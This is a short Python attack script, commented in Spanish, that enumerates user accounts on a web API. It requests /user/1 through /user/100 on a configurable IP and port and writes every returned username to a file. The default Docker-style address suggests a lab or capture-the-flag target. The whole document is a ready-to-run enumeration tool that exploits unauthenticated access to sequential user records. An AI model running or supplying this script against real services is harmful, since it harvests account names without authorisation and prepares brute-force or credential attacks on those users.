#!/usr/bin/env python3

import requests
#Creditos a vareCruzz
# Configuracion
IP = "172.17.0.2" #CHANGE THIS
PORT = 12345 #CHANGE THIS
BASE_URL = f"http://{IP}:{PORT}"

# Rango de IDs
START_ID = 1
END_ID = 100

# Archivo de salida
OUTPUT_FILE = "usernames.txt"

# Timeout
TIMEOUT = 3


def enumerate_users():
    print(f"[*] API: {BASE_URL}")
    print(f"[*] Rango: {START_ID} - {END_ID}")
    print(f"[*] Salida: {OUTPUT_FILE}")
    print()

    encontrados = 0

    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        for user_id in range(START_ID, END_ID + 1):
            url = f"{BASE_URL}/user/{user_id}"

            try:
                response = requests.get(url, timeout=TIMEOUT)

            except requests.RequestException as e:
                print(f"[!] Error ID {user_id}: {e}")
                continue

            if response.status_code == 200:
                try:
                    data = response.json()
                except ValueError:
                    print(f"[?] ID {user_id}: respuesta no válida")
                    continue

                username = data.get("username")

                if username:
                    print(f"[+] ID {user_id}: {username}")
                    f.write(username + "\n")
                    encontrados += 1

            elif response.status_code == 404:
                print(f"[-] ID {user_id}: no encontrado")

            else:
                print(f"[?] ID {user_id}: HTTP {response.status_code}")

    print()
    print("[*] Enumeracion terminada.")
    print(f"[*] Usuarios encontrados: {encontrados}")
    print(f"[*] Guardados en: {OUTPUT_FILE}")


if __name__ == "__main__":
    enumerate_users()